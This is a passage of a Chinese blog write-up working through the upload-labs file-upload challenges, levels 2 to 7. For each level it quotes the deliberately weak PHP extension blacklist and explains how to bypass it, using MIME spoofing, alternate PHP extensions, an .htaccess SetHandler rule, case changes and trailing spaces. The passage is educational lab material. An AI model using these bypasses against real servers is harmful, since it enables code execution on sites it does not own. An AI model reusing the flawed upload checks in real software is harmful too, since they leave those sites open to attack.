boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'文件类型不正确，请重新上传！'</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p>第二关有两种绕过方式<br>● 将后缀名修改为符合要求的后缀名然后发送，在burp中将后缀修改为php<br>● 以后缀名为PHP直接发送，在浏览器中修改MIME类型为image&#x2F;jpeg<br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/4.png"></p><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a><font size="5"><strong>第三关</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file_exists<span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">'.asp'</span>,<span class="token string">'.aspx'</span>,<span class="token string">'.php'</span>,<span class="token string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> deldot<span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//删除文件名末尾的点        <span class="token variable">$file_ext</span> <span class="token operator">=</span> strrchr<span class="token punctuation">(</span><span class="token variable">$file_name</span>, <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //转换为小写        <span class="token variable">$file_ext</span> <span class="token operator">=</span> str_ireplace<span class="token punctuation">(</span><span class="token string">'::<span class="token variable">$DATA</span>'</span>, <span class="token string">''</span>, <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//去除字符串::<span class="token variable">$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //收尾去空        if<span class="token punctuation">(</span><span class="token operator">!</span>in_array<span class="token punctuation">(</span><span class="token variable">$file_ext</span>, <span class="token variable">$deny_ext</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token string">'/'</span>.date<span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span>.rand<span class="token punctuation">(</span>1000,9999<span class="token punctuation">)</span>.<span class="token variable">$file_ext</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$temp_file</span>,<span class="token variable">$img_path</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> UPLOAD_PATH <span class="token keyword">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p>这一关很明显是一个黑名单的方式但是并不是很严谨，可以phtml，php3，php4, php5, pht的这种格式绕过通关大小写的方式绕过，但是前提是要在配置文件里面有这样的一句话</p><pre class=" language-bash"><code class="language-bash">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</code></pre><p>不然的话即使能上传上去也不能正常解析执行，因为服务器不知道这个是什么执行。<br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/5.png"></p><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a><font size="5"><strong>第四关</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file_exists<span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">".php"</span>,<span class="token string">".php5"</span>,<span class="token string">".php4"</span>,<span class="token string">".php3"</span>,<span class="token string">".php2"</span>,<span class="token string">"php1"</span>,<span class="token string">".html"</span>,<span class="token string">".htm"</span>,<span class="token string">".phtml"</span>,<span class="token string">".pht"</span>,<span class="token string">".pHp"</span>,<span class="token string">".pHp5"</span>,<span class="token string">".pHp4"</span>,<span class="token string">".pHp3"</span>,<span class="token string">".pHp2"</span>,<span class="token string">"pHp1"</span>,<span class="token string">".Html"</span>,<span class="token string">".Htm"</span>,<span class="token string">".pHtml"</span>,<span class="token string">".jsp"</span>,<span class="token string">".jspa"</span>,<span class="token string">".jspx"</span>,<span class="token string">".jsw"</span>,<span class="token string">".jsv"</span>,<span class="token string">".jspf"</span>,<span class="token string">".jtml"</span>,<span class="token string">".jSp"</span>,<span class="token string">".jSpx"</span>,<span class="token string">".jSpa"</span>,<span class="token string">".jSw"</span>,<span class="token string">".jSv"</span>,<span class="token string">".jSpf"</span>,<span class="token string">".jHtml"</span>,<span class="token string">".asp"</span>,<span class="token string">".aspx"</span>,<span class="token string">".asa"</span>,<span class="token string">".asax"</span>,<span class="token string">".ascx"</span>,<span class="token string">".ashx"</span>,<span class="token string">".asmx"</span>,<span class="token string">".cer"</span>,<span class="token string">".aSp"</span>,<span class="token string">".aSpx"</span>,<span class="token string">".aSa"</span>,<span class="token string">".aSax"</span>,<span class="token string">".aScx"</span>,<span class="token string">".aShx"</span>,<span class="token string">".aSmx"</span>,<span class="token string">".cEr"</span>,<span class="token string">".sWf"</span>,<span class="token string">".swf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> deldot<span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//删除文件名末尾的点        <span class="token variable">$file_ext</span> <span class="token operator">=</span> strrchr<span class="token punctuation">(</span><span class="token variable">$file_name</span>, <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //转换为小写        <span class="token variable">$file_ext</span> <span class="token operator">=</span> str_ireplace<span class="token punctuation">(</span><span class="token string">'::<span class="token variable">$DATA</span>'</span>, <span class="token string">''</span>, <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//去除字符串::<span class="token variable">$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //收尾去空        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>in_array<span class="token punctuation">(</span><span class="token variable">$file_ext</span>, <span class="token variable">$deny_ext</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token string">'/'</span>.date<span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span>.rand<span class="token punctuation">(</span>1000,9999<span class="token punctuation">)</span>.<span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$temp_file</span>, <span class="token variable">$img_path</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件不允许上传!'</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> UPLOAD_PATH <span class="token keyword">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p>这个也是黑名单的方法比之前的方法严格多了，按照上一关的方式不可能突破，这一关先上传.htaccess 文件在上传一张图片中包含PHP代码的文件</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>FilesMatch <span class="token string">"gg.jpg"</span><span class="token operator">></span>SetHandler application/x-httpd-php<span class="token operator">&lt;</span>/FilesMatch<span class="token operator">></span>  </code></pre><p>命名为.htaccess这个文件是伪静态文件也就是说，将文件中含有gg.jpg文件用PHP代码解析执行<br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/6.png"></p><p>在上传一张gg.jpg包含php代码的文件<br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/7.png"><br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/8.png"></p><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a><font size="5"><strong>第五关</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file_exists<span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">".php"</span>,<span class="token string">".php5"</span>,<span class="token string">".php4"</span>,<span class="token string">".php3"</span>,<span class="token string">".php2"</span>,<span class="token string">".html"</span>,<span class="token string">".htm"</span>,<span class="token string">".phtml"</span>,<span class="token string">".pht"</span>,<span class="token string">".pHp"</span>,<span class="token string">".pHp5"</span>,<span class="token string">".pHp4"</span>,<span class="token string">".pHp3"</span>,<span class="token string">".pHp2"</span>,<span class="token string">".Html"</span>,<span class="token string">".Htm"</span>,<span class="token string">".pHtml"</span>,<span class="token string">".jsp"</span>,<span class="token string">".jspa"</span>,<span class="token string">".jspx"</span>,<span class="token string">".jsw"</span>,<span class="token string">".jsv"</span>,<span class="token string">".jspf"</span>,<span class="token string">".jtml"</span>,<span class="token string">".jSp"</span>,<span class="token string">".jSpx"</span>,<span class="token string">".jSpa"</span>,<span class="token string">".jSw"</span>,<span class="token string">".jSv"</span>,<span class="token string">".jSpf"</span>,<span class="token string">".jHtml"</span>,<span class="token string">".asp"</span>,<span class="token string">".aspx"</span>,<span class="token string">".asa"</span>,<span class="token string">".asax"</span>,<span class="token string">".ascx"</span>,<span class="token string">".ashx"</span>,<span class="token string">".asmx"</span>,<span class="token string">".cer"</span>,<span class="token string">".aSp"</span>,<span class="token string">".aSpx"</span>,<span class="token string">".aSa"</span>,<span class="token string">".aSax"</span>,<span class="token string">".aScx"</span>,<span class="token string">".aShx"</span>,<span class="token string">".aSmx"</span>,<span class="token string">".cEr"</span>,<span class="token string">".sWf"</span>,<span class="token string">".swf"</span>,<span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> deldot<span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//删除文件名末尾的点        <span class="token variable">$file_ext</span> <span class="token operator">=</span> strrchr<span class="token punctuation">(</span><span class="token variable">$file_name</span>, <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> str_ireplace<span class="token punctuation">(</span><span class="token string">'::<span class="token variable">$DATA</span>'</span>, <span class="token string">''</span>, <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//去除字符串::<span class="token variable">$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //首尾去空        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>in_array<span class="token punctuation">(</span><span class="token variable">$file_ext</span>, <span class="token variable">$deny_ext</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token string">'/'</span>.date<span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span>.rand<span class="token punctuation">(</span>1000,9999<span class="token punctuation">)</span>.<span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$temp_file</span>, <span class="token variable">$img_path</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> UPLOAD_PATH <span class="token keyword">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p>对比上面的文件发现少了一行转换为小写的代码，对此我们可以采用大小写绕过，但是由于Linux是大小写敏感上传的文件不能被正常的执行，在windows上是可以正常的执行。<br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/9.png"></p><p>也就发现即使上传上去也不能正常执行，这是由于Linux系统特性的原因。<br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/10.png"></p><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a><font size="5"><strong>第六关</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file_exists<span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">".php"</span>,<span class="token string">".php5"</span>,<span class="token string">".php4"</span>,<span class="token string">".php3"</span>,<span class="token string">".php2"</span>,<span class="token string">".html"</span>,<span class="token string">".htm"</span>,<span class="token string">".phtml"</span>,<span class="token string">".pht"</span>,<span class="token string">".pHp"</span>,<span class="token string">".pHp5"</span>,<span class="token string">".pHp4"</span>,<span class="token string">".pHp3"</span>,<span class="token string">".pHp2"</span>,<span class="token string">".Html"</span>,<span class="token string">".Htm"</span>,<span class="token string">".pHtml"</span>,<span class="token string">".jsp"</span>,<span class="token string">".jspa"</span>,<span class="token string">".jspx"</span>,<span class="token string">".jsw"</span>,<span class="token string">".jsv"</span>,<span class="token string">".jspf"</span>,<span class="token string">".jtml"</span>,<span class="token string">".jSp"</span>,<span class="token string">".jSpx"</span>,<span class="token string">".jSpa"</span>,<span class="token string">".jSw"</span>,<span class="token string">".jSv"</span>,<span class="token string">".jSpf"</span>,<span class="token string">".jHtml"</span>,<span class="token string">".asp"</span>,<span class="token string">".aspx"</span>,<span class="token string">".asa"</span>,<span class="token string">".asax"</span>,<span class="token string">".ascx"</span>,<span class="token string">".ashx"</span>,<span class="token string">".asmx"</span>,<span class="token string">".cer"</span>,<span class="token string">".aSp"</span>,<span class="token string">".aSpx"</span>,<span class="token string">".aSa"</span>,<span class="token string">".aSax"</span>,<span class="token string">".aScx"</span>,<span class="token string">".aShx"</span>,<span class="token string">".aSmx"</span>,<span class="token string">".cEr"</span>,<span class="token string">".sWf"</span>,<span class="token string">".swf"</span>,<span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> deldot<span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//删除文件名末尾的点        <span class="token variable">$file_ext</span> <span class="token operator">=</span> strrchr<span class="token punctuation">(</span><span class="token variable">$file_name</span>, <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //转换为小写        <span class="token variable">$file_ext</span> <span class="token operator">=</span> str_ireplace<span class="token punctuation">(</span><span class="token string">'::<span class="token variable">$DATA</span>'</span>, <span class="token string">''</span>, <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//去除字符串::<span class="token variable">$DATA</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>in_array<span class="token punctuation">(</span><span class="token variable">$file_ext</span>, <span class="token variable">$deny_ext</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token string">'/'</span>.date<span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span>.rand<span class="token punctuation">(</span>1000,9999<span class="token punctuation">)</span>.<span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$temp_file</span>,<span class="token variable">$img_path</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件不允许上传'</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> UPLOAD_PATH <span class="token keyword">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p>比上一关少了一行首尾去空的代码，后缀名+空格的形式去绕过，注意：虽然能绕过上传但是并不会被服务器解析执行这是由于Linux系统特性，他不会像windows那样将文件后面的的空格给强制取消。<br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/11.png"><br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/12.png"></p><h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a><font size="5"><strong>第七关</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file_exists<span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">".php"</span>,<span class="token string">".php5"</span>,<span class="token string">".php4"</span>,<span class="token string">".php3"</span>,<span class="token string">".php2"</span>,<span class="token string">".html"</span>,<span class="token string">".htm"</span>,<span class="token string">".phtml"</span>,<span class="token string">".pht"</span>,<span class="token string">".pHp"</span>,<span class="token string">".pHp5"</span>,<span class="token string">".pHp4"</span>,<span class="token string">".pHp3"</span>,<span class="token string">".pHp2"</span>,<span class="token string">".Html"</span>,<span class="token string">".Htm"</span>,<span class="token string">".pHtml"</span>,<span class="token string">".jsp"</span>,<span class="token string">".jspa"</span>,<span class="token string">".jspx"</span>,<span class="token string">".jsw"</span>,<span class="token string">".jsv"</span>,<span class="token string">".jspf"</span>,<span class="token string">".jtml"</span>,<span class="token string">".jSp"</span>,<span class="token string">".jSpx"</span>,<span class="token string">".jSpa"</span>,<span class="token string">".jSw"</span>,<span class="token string">".jSv"</span>,<span class="token string">".jSpf"</span>,<span class="token string">".jHtml"</span>,<span class="token string">".asp"</span>,<span class="token string">".aspx"</span>,<span class="token string">".asa"</span>,<span class="token string">".asax"</span>,<span class="token string">".ascx"</span>,<span class="token string">".ashx"</span>,<span class="token string">".asmx"</span>,<span class="token string">".cer"</span>,<span class="token string">".aSp"</span>,<span class="token string">".aSpx"</span>,<span class="token string">".aSa"</span>,<span class="token string">".aSax"</span>,<span class="token string">".aScx"</span>,<span class="token string">".aShx"</span>,<span class="token string">".aSmx"</span>,<span class="token string">".cEr"</span>,<span class="token string">".sWf"</span>,<span class="token string">".swf"</span>,<span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> strrchr<span class="token punctuation">(</span><span class="token variable">$file_name</span>, <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //转换为小写        <span class="token variable">$file_ext</span> <span class="token operator">=</span> str_ireplace<span class="token punctuation">(</span><span class="token string">'::<span class="token variable">$DATA</span>'</span>, <span class="token string">''</span>, <span class="token 